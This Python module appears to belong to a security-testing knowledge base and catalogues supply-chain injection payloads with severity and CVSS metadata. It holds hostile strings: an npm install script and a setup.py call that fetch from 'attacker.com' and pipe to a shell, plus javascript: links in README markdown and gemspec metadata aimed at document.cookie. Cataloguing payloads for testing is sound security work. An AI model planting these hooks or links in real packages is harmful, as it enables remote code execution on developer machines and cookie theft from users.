#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Supply Chain Metadata Injection Payloads
"""

from ..models import PayloadEntry

SUPPLY_CHAIN_PAYLOADS = {
    "npm_package_json_script": PayloadEntry(
        payload='{"scripts":{"install":"curl attacker.com|sh"}}',
        contexts=["json", "npm"],
        severity="critical",
        cvss_score=9.8,
        description="NPM install script injection (RCE)",
        tags=["supply-chain", "npm", "rce", "install-script"],
        reliability="high",
        attack_surface="developer-tool"
    ),
    "pypi_setup_py": PayloadEntry(
        payload='import os; os.system("curl attacker.com")',
        contexts=["python", "pypi"],
        severity="critical",
        cvss_score=9.8,
        description="PyPI setup.py malicious execution",
        tags=["supply-chain", "pypi", "rce", "python"],
        reliability="high",
        attack_surface="developer-tool"
    ),
    "registry_markdown_xss": PayloadEntry(
        payload="<a href='javascript:alert(document.cookie)'>Click for docs</a>",
        contexts=["markdown", "html_content"],
        severity="medium",
        cvss_score=6.1,
        description="Malicious link in package README markdown",
        tags=["supply-chain", "registry", "markdown", "xss"],
        reliability="medium",
        attack_surface="web"
    ),
    "gemspec_metadata_xss": PayloadEntry(
        payload='s.homepage = "javascript:alert(1)"',
        contexts=["ruby", "rubygems"],
        severity="high",
        cvss_score=7.0,
        description="RubyGems metadata homepage XSS",
        tags=["supply-chain", "rubygems", "metadata"],
        reliability="medium",
        attack_surface="web"
    )
}

SUPPLY_CHAIN_TOTAL = len(SUPPLY_CHAIN_PAYLOADS)
